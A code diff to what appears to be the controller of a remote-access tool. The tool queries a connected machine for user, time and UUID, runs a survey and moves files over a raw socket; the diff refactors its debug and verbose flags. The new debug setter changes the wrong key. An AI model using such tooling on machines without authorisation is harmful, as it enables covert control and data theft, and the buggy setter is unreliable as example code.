@@ -20,7 +20,7 @@ DEBUG = True
 CURRENT_WORKING_DIR = ""
 TASK_FILES_LOCATION = "tasks"
 CONNECTED_HOST = None
-CONFIG = {"TCP_TIMEOUT": 1}
+CONFIG = {"TCP_TIMEOUT": 1, "VERBOSE": True, "DEBUG": True}
 #IGNORE SSL CHECKS
 
 try:
@@ -130,7 +130,7 @@ def send_data(s, plain_text):
     msg = plain_text + "[END]"
     s.send(msg.encode('utf-8'))
     #s.send(encrypt(msg).encode('utf-8')+b"[END]")
-    if DEBUG:
+    if CONFIG['DEBUG']:
         print_info("Sent:\n" +plain_text)
 
 def file_transfer_get(conn, filename):      #get file from server
@@ -150,7 +150,7 @@ def file_transfer_get(conn, filename):      #get file from server
                 bytes_read = conn.recv(128)
                 current_size = os.path.getsize(filename)
         print()
-        if VERBOSE:
+        if CONFIG['VERBOSE']:
             
             print_good("Transfer completed")
 
@@ -163,11 +163,11 @@ def file_transfer_get(conn, filename):      #get file from server
 def file_transfer_put(conn, commands):       #push file to server
     send_data(conn, commands + "[END]")
     file_name = commands.split()[1]
-    if VERBOSE:
+    if CONFIG['VERBOSE']:
         print_info("Trying to open: {}".format(file_name))
     f = open(file_name, 'rb')
     data = f.read(128)
-    if VERBOSE:
+    if CONFIG['VERBOSE']:
         print_info("Sending File:\n" + file_name)
     while data:
         conn.send(data)
@@ -178,7 +178,7 @@ def file_transfer_put(conn, commands):       #push file to server
 def listen_for_data(conn, mode="print",encoding="b64"):
     conn.settimeout(CONFIG['TCP_TIMEOUT'])
     try:
-        if DEBUG:
+        if CONFIG['DEBUG']:
             print_info("Waiting for data...")
 
         recv_total = ""
@@ -220,7 +220,7 @@ def query_for_tasklist(machine_addr):
     try:
         task_files = listdir(TASK_FILES_LOCATION)
         if machine_addr in task_files:
-            if VERBOSE:
+            if CONFIG['VERBOSE']:
                 print_info("Found a task file")
             return True
         else:
@@ -252,7 +252,7 @@ def delete_task_file(task_file_name):
     try:
         if path.isfile(path.join("tasks") + task_file_name) is True:
             remove(path.join("tasks") + task_file_name)
-            if VERBOSE:
+            if CONFIG['VERBOSE']:
                 print_info("Successful Remove Task List")
     except:
         pass
@@ -272,21 +272,21 @@ def run_initial_survey(conn):
     print(RSTCOLORS)
 
 def get_time(conn):
-    if DEBUG:
+    if CONFIG['DEBUG']:
         print_info("Asking for Local System Time")
     send_data(conn,"[time]")
     time = listen_for_data(conn, "store")
     return time
 
 def get_username(conn):
-    if DEBUG:
+    if CONFIG['DEBUG']:
         print_info("Asking for Username")
     send_data(conn,"[user]")
     username = listen_for_data(conn, "store")
     return username
 
 def get_uuid(conn):
-    if DEBUG:
+    if CONFIG['DEBUG']:
         print_info("Asking for UUID")
     send_data(conn,"[UUID]")
     uuid = listen_for_data(conn, "store")
@@ -312,6 +312,12 @@ def set_variables(cmd):
     if variable == "timeout":
         CONFIG['TCP_TIMEOUT'] = float(param)
         print_good(f"New TCP Timeout Value: {CONFIG['TCP_TIMEOUT']}")
+    if variable == "verbose":
+        CONFIG['VERBOSE'] = bool(param)
+        print_good(f"New Verbose Value: {CONFIG['VERBOSE']}")
+    if variable == "debug":
+        CONFIG['VERBOSE'] = bool(param)
+        print_good(f"New Debug Value: {CONFIG['DEBUG']}")
 
 def print_config():
     print(CONFIG)
@@ -437,16 +443,16 @@ def listen():
                                 print_fail("Destination file path does not exist")
 
                         if transfer is True:
-                            if VERBOSE:
+                            if CONFIG['VERBOSE']:
                                 print_info("Trying to Download {} --> {}".format(src_filename, dest_filename))
                             send_data(conn, "[get] " + src_filename + "[END]")
                             data = listen_for_data(conn,mode="store")
-                            if DEBUG:
+                            if CONFIG['DEBUG']:
                                 print(f"DATA: {data}")
                             if "file-not-found" in data:
                                 print_fail("File not found")          
                             elif "file-found" in data:
-                                if VERBOSE:
+                                if CONFIG['VERBOSE']:
                                     print_good("File Found, Downloading...")
                                 file_transfer_get(conn, dest_filename)
                             else:
@@ -463,7 +469,7 @@ def listen():
                         if len(command.split()) == 1:      #example_file
                             if path.isfile(command.split()[0]):
                                 upload = "[put] " + command.split()[0] + " " + path.basename(command.split()[0])
-                                if VERBOSE:
+                                if CONFIG['VERBOSE']:
                                     print_info("Uploading --> {}".format(command))
                                 file_transfer_put(conn, upload)
                             else:
@@ -513,7 +519,7 @@ def listen():
                             cmd = ""
                         elif command.startswith("cd "):
                             new_dir = command.lstrip("cd ")
-                            if VERBOSE:
+                            if CONFIG['VERBOSE']:
                                 print_info("Changing Working Directory:")
                                 print(new_dir)
                             change_working_dir(conn, new_dir)
